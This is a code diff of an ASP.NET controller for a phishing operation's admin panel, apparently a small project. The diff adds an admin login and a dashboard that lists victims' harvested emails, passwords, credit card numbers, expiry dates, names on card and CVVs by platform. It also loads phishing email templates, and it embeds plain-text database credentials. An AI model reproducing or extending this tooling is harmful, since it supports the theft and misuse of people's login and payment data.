@@ -7,8 +7,8 @@ namespace WebProject.Controllers;
 
 public class HomeController : Controller
 {
-    private readonly string connectionString = "Server=localhost;Port=5432;Username=erdemkurt;Password=353535;Database=phishing;";
-    
+    // private readonly string connectionString = "Server=localhost;Port=5432;Username=erdemkurt;Password=353535;Database=phishing;";
+    private readonly string connectionString = "Server=localhost;Port=49152;Username=senayilmaz;Password=2002;Database=webprojectdb;";
     private readonly ILogger<HomeController> _logger;
     //erdme 
 
@@ -16,31 +16,43 @@ public class HomeController : Controller
     {
         _logger = logger;
     }
-
+    
     public IActionResult Index()
+    {
+        
+        return View();
+    }
+    [HttpPost]
+    public IActionResult Index(AdminModel hacker)
+    {
+        bool isHacker = checkAdmin(hacker);
+        if (isHacker)
+        {
+            return RedirectToAction("AdminDashboard", "Home");
+        }
+        else
+        {
+            ViewData["ErrorMessage"] = "Kullanıcı adı veya şifre yanlış";
+        }
+        return View();
+    }
+    public IActionResult AdminDashboard()
     {
         List<UserModel> phishingUserList = GetUserFromDatebase();
         Dictionary<int, int> platformCounts = GetPlatformCountsFromDatabase();
         ViewBag.PlatformCounts = platformCounts;
         return View(phishingUserList);
     }
-    
     public IActionResult SendEmail()
     {
         List<UserModel> userEmail = GetUserFromDatebase();
         return View(userEmail);
     }
-    
     public IActionResult EmailTemplates()
     {
-        
-        
-        return View();
+        var emailTemplates = GetEmailTemplatesFromDatabase();
+        return View(emailTemplates);
     }
-    
-    
-    
-
     [ResponseCache(Duration = 0, Location = ResponseCacheLocation.None, NoStore = true)]
     public IActionResult Error()
     {
@@ -79,7 +91,7 @@ public class HomeController : Controller
 
     private List<UserModel> GetUserFromDatebase()
     {
-        string selectQuery = "SELECT pu.user_id, pu.user_email, pu.user_password, pu.user_cc, pu.user_date, pu.user_cvv, pl.platform_name " +
+        string selectQuery = "SELECT pu.user_id, pu.user_email, pu.user_password, pu.user_cc, pu.user_date,pu.user_name_on_card ,pu.user_cvv, pl.platform_name, pu.platform_id " +
                              "FROM \"phishing_users\" pu " +
                              "INNER JOIN \"platforms\" pl ON pu.platform_id = pl.platform_id";
 
@@ -96,13 +108,14 @@ public class HomeController : Controller
                     {
                         UserModel phishinguser = new UserModel
                         {
-                            UserId = Convert.ToInt32(reader["user_id"]),
-                            PlatformName = reader["platform_name"].ToString(),
-                            UserEmail = reader["user_email"].ToString(),
-                            UserPassword = reader["user_password"].ToString(),
-                            UserCC = reader["user_cc"].ToString(),
-                            UserDate = reader["user_date"].ToString(),
-                            UserCVV = reader["user_cvv"].ToString()
+                            user_id = reader["user_id"] != DBNull.Value ? Convert.ToInt32(reader["user_id"]) : 0,
+                            platform_id = reader["platform_id"] != DBNull.Value ? Convert.ToInt32(reader["platform_id"]) : 0,
+                            user_email = reader["user_email"].ToString(),
+                            user_password = reader["user_password"].ToString(),
+                            user_name_on_card = reader["user_name_on_card"] != DBNull.Value ? reader["user_name_on_card"].ToString() : null,
+                            user_cc = reader["user_cc"] != DBNull.Value ? reader["user_cc"].ToString() : null,
+                            user_date = reader["user_date"] != DBNull.Value ? reader["user_date"].ToString() : null,
+                            user_cvv = reader["user_cvv"] != DBNull.Value ? reader["user_cvv"].ToString() : null
                         };
                         PhishingUserList.Add(phishinguser);
                     }
@@ -110,13 +123,12 @@ public class HomeController : Controller
             }
         }
         return PhishingUserList;
-
     }
     
     public Dictionary<int, int> GetPlatformCountsFromDatabase()
     {
         Dictionary<int, int> platformCounts = new Dictionary<int, int>();
-        string selectQuery = "SELECT platform_id, COUNT(*) AS user_count FROM phishing_users GROUP BY platform_id;";
+        string selectQuery = "SELECT platform_id, COUNT(*) AS user_count FROM phishing_users WHERE platform_id IS NOT NULL GROUP BY platform_id;";
 
         using (var connection = new NpgsqlConnection(connectionString))
         {
@@ -127,9 +139,12 @@ public class HomeController : Controller
                 {
                     while (reader.Read())
                     {
-                        int platformId = Convert.ToInt32(reader["platform_id"]);
-                        int count = Convert.ToInt32(reader["user_count"]);
-                        platformCounts.Add(platformId, count);
+                        if (reader["platform_id"] != DBNull.Value)
+                        {
+                            int platformId = Convert.ToInt32(reader["platform_id"]);
+                            int count = Convert.ToInt32(reader["user_count"]);
+                            platformCounts.Add(platformId, count);
+                        }
                     }
                 }
             }
@@ -137,6 +152,7 @@ public class HomeController : Controller
 
         return platformCounts;
     }
+
     
     private List<EmailTemplateModel> GetEmailTemplatesFromDatabase()
     {
@@ -166,8 +182,28 @@ public class HomeController : Controller
                 }
             }
         }
-
         return emailTemplates;
     }
-    
+    public bool checkAdmin(AdminModel admin)
+    {
+        string selectQuery = "SELECT * FROM admin WHERE admin_username = @AdminName AND admin_password = @AdminPassword";
+        bool isExecuteCorrect = false;
+        using (var connection = new NpgsqlConnection(connectionString))
+        {
+            connection.Open();
+            using (var command = new NpgsqlCommand(selectQuery, connection))
+            {
+                command.Parameters.AddWithValue("@AdminName", admin.admin_username);
+                command.Parameters.AddWithValue("@AdminPassword", admin.admin_password);
+                using (var reader = command.ExecuteReader())
+                {
+                    if (reader.Read())
+                    {
+                        isExecuteCorrect = true;
+                    }
+                }
+            }
+        }
+        return isExecuteCorrect;
+    }
 }
